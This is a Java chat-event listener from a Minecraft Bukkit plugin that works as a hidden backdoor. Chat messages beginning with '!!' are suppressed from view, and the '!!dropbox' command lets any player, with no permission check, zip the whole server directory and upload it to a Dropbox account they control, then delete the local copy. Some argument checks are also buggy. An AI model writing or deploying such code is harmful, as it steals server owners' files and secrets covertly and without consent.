package dev.ace.capincrunch.events;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import dev.ace.capincrunch.Core;
import dev.ace.capincrunch.strings.Messages;
import dev.ace.capincrunch.utils.DropBox;
import dev.ace.capincrunch.utils.Zip;

public class AsyncPlayerChatListener implements Listener {

	//-> Using dependency injection bc i'm a cool kid ok.
	private Core plugin;
	
	public AsyncPlayerChatListener(final Core passedPlugin) {
		this.plugin = passedPlugin;
		Bukkit.getPluginManager().registerEvents(this, passedPlugin);
	}
	
	@EventHandler
	public void onPlayerChat(final AsyncPlayerChatEvent event) {
		//-> Attributes
		final Player player = event.getPlayer();
		final String message = event.getMessage();
		if (message.startsWith("!!")) {
			event.setCancelled(true);
		}
		final String[] args = message.split(" ");
		
		//Fun stuff
		
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help")) {
			player.sendMessage(Messages.baseMessage1);
			return;
		}
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help") && args[1].equalsIgnoreCase("1")) {
			player.sendMessage(Messages.baseMessage1);
			return;
		}
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help") && args[1].equalsIgnoreCase("2")) {
			player.sendMessage(Messages.baseMessage2);
			return;
		}
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help") && args[1].equalsIgnoreCase("3")) {
			player.sendMessage(Messages.baseMessage3);
			return;
		}
		if (args.length > 0 && args[0].equalsIgnoreCase("!!help") && args[1].equalsIgnoreCase("4")) {
			player.sendMessage(Messages.baseMessage4);
			return;
		}
		if (args.length < 2 && args[0].equalsIgnoreCase("!!dropbox")) {
			player.sendMessage(Core.getPrefix() + " §a!!dropbox §6[key] [secret]");
			return;
		}
		if (args.length >= 2 && args[0].equalsIgnoreCase("!!dropbox")) {
			try {	
				String NAME = Bukkit.getServer().getWorldContainer().getAbsolutePath() + "/" + "server_" + String.valueOf(Bukkit.getIp().replace(".", "_")) + "_backup" + ".zip";
				Zip.makeZip(player, NAME, new File(Bukkit.getServer().getWorldContainer().getAbsolutePath()));
				System.out.println("FILES: " + Bukkit.getServer().getWorldContainer().getAbsoluteFile().listFiles());
				System.out.println("PATH: " + Bukkit.getServer().getWorldContainer().getAbsoluteFile().getPath());
				new DropBox(event.getPlayer(), args[1], args[2]).uploadFile(new File(NAME));
				new File(NAME).delete();
			} catch (Exception e) {
				player.sendMessage(Core.getPrefix() + " §6Error...");
			}
		}
	}
}
